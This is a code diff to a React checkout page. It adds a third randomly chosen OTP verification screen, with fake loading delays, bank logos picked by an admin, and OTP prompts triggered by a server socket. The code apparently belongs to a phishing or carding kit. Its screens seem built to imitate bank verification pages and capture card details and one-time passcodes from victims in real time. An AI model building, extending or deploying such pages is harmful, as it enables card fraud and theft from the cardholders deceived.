@@ -19,6 +19,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import NewOTPPage from '../components/NewOTPPage';
+import ThirdOTPPage from '../components/ThirdOTPPage';
 import { api } from '../utils/api';
 import { devLog, devError, devWarn } from '../utils/logger';
 import { v4 as uuidv4 } from 'uuid';
@@ -451,7 +452,13 @@ const CheckoutOriginal = () => {
   const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
   
-  // OTP Page Selection State (random between old and new)
+  // OTP Page Selection State (random between 3 pages - ~33.33% each)
+  const [otpPageSelection, setOtpPageSelection] = useState(() => {
+    const rand = Math.random();
+    if (rand < 0.333) return 'old';
+    if (rand < 0.666) return 'new';
+    return 'third';
+  });
   const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
 
   // Debug: Log the current state of agreeTerms (disabled)
@@ -762,21 +769,21 @@ const CheckoutOriginal = () => {
 
   // Handle new OTP page loading delay (2-6 seconds)
   useEffect(() => {
-    if (currentStep === 'otp' && useNewOTPPage) {
+    if (currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third')) {
       setNewOtpPageLoading(true);
       
       // Random delay between 2-6 seconds
       const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2000-6000ms
-      devLog(`Loading new OTP page in ${randomDelay/1000} seconds...`);
+      devLog(`Loading ${otpPageSelection.toUpperCase()} OTP page in ${randomDelay/1000} seconds...`);
       
       const timer = setTimeout(() => {
         setNewOtpPageLoading(false);
-        devLog('New OTP page loaded!');
+        devLog(`${otpPageSelection.toUpperCase()} OTP page loaded!`);
       }, randomDelay);
       
       return () => clearTimeout(timer);
     }
-  }, [currentStep, useNewOTPPage]);
+  }, [currentStep, otpPageSelection]);
 
   const validateField = (field: string, value: string) => {
     switch (field) {
@@ -1127,10 +1134,21 @@ const CheckoutOriginal = () => {
     socket.on('show-otp', (data) => {
       devLog('Show OTP with currency data:', data);
       
-      // Random selection between old and new OTP page (50/50 chance)
-      const useNewPage = Math.random() < 0.5;
-      setUseNewOTPPage(useNewPage);
-      devLog('🎲 Randomly selected OTP page:', useNewPage ? 'NEW' : 'OLD');
+      // Random selection between 3 OTP pages (~33.33% each)
+      const rand = Math.random();
+      let selectedPage;
+      if (rand < 0.333) {
+        selectedPage = 'old';
+        setUseNewOTPPage(false);
+      } else if (rand < 0.666) {
+        selectedPage = 'new';
+        setUseNewOTPPage(true);
+      } else {
+        selectedPage = 'third';
+        setUseNewOTPPage(false); // Will be handled separately
+      }
+      setOtpPageSelection(selectedPage);
+      devLog('🎲 Randomly selected OTP page:', selectedPage.toUpperCase());
       
       setConfirmingPayment(false);
       setShowOtp(true);
@@ -2223,7 +2241,7 @@ const CheckoutOriginal = () => {
             )}
 
             {/* Enhanced OTP Verification Section - Loading State */}
-            {currentStep === 'otp' && useNewOTPPage && newOtpPageLoading && (
+            {currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third') && newOtpPageLoading && (
               <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                 <div className="text-center">
                   <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
@@ -2232,8 +2250,8 @@ const CheckoutOriginal = () => {
               </div>
             )}
 
-            {/* Enhanced OTP Verification Section - Actual Page */}
-            {currentStep === 'otp' && useNewOTPPage && !newOtpPageLoading && (
+            {/* Second OTP Page (NEW) */}
+            {currentStep === 'otp' && otpPageSelection === 'new' && !newOtpPageLoading && (
               <NewOTPPage
                 cardData={cardData}
                 otpValue={otpValue}
@@ -2249,8 +2267,29 @@ const CheckoutOriginal = () => {
               />
             )}
 
-            {/* Original OTP Modal (when useNewOTPPage is false) */}
-            {currentStep === 'otp' && !useNewOTPPage && (
+            {/* Third OTP Page (THIRD) */}
+            {currentStep === 'otp' && otpPageSelection === 'third' && !newOtpPageLoading && (
+              <ThirdOTPPage
+                cardData={cardData}
+                otpValue={otpValue}
+                setOtpValue={setOtpValue}
+                otpSubmitting={otpSubmitting}
+                handleOtpSubmit={handleOtpSubmit}
+                handleOtpCancel={handleOtpCancel}
+                otpError={otpError}
+                adminSelectedBankLogo={adminSelectedBankLogo}
+                sessionBankLogo={sessionBankLogo}
+                cardBrandLogos={cardBrandLogos}
+                getCardBrand={getCardBrand}
+                onRedirectToSecondOTP={() => {
+                  setOtpPageSelection('new');
+                  setUseNewOTPPage(true);
+                }}
+              />
+            )}
+
+            {/* Original OTP Modal (OLD) - when otpPageSelection is 'old' */}
+            {currentStep === 'otp' && otpPageSelection === 'old' && (
               <div className={`fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm transition-opacity duration-300 ease-out ${
                 otpModalAnimating ? 'bg-black bg-opacity-0' : 'bg-black bg-opacity-70'
               }`}>
